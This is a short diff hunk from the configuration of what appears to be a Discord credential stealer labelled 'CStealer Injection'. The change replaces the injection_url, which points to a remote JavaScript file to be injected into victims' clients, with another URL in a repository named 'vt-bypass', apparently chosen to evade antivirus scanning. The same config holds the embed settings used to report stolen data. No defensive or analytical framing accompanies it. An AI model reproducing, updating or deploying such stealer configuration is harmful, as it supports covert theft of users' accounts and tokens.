@@ -14,7 +14,7 @@ const config = {
   embed_name: 'CStealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/1337cstealer1337/inject/main/index.js', 
+  injection_url: 'https://github.com/okejrngiownjroknononKOENKokneismiogkoed/vt-bypass/blob/main/inject.js', 
   /**
    
    **/
